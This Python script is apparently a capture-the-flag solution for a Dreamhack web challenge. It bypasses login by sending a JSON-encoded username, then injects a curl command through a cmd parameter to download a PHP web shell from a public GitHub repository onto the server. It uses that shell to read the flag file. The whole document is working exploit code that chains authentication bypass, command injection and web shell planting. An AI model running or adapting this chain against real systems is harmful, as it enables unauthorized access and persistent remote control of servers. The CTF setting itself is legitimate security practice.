# MJSEC JongYun
import requests
import json
import threading

# Target
host = "http://host3.dreamhack.games:20341/"

# 세션 유지
session = requests.Session()

def exploit():
   
    login_data = {
        "username": json.dumps({"username": True})
    }
    login_res = session.post(host, data=login_data)
    print("Login Response:", login_res.text)

   
    download_webshell = "curl https://raw.githubusercontent.com/JohnTroony/php-webshells/master/Collection/Simple-Webshell.php -o webshell.php"
    webshell_res = session.get(f"{host}/test.php?cmd={download_webshell}")
    print("webshell res:", webshell_res.text)

    data={
        "cmd":"./../../../flag"
    }
    flag = session.post(f"{host}/webshell.php",data=data)
    print("flag:", flag.text)

thread = threading.Thread(target=exploit)
thread.start()
thread.join()  
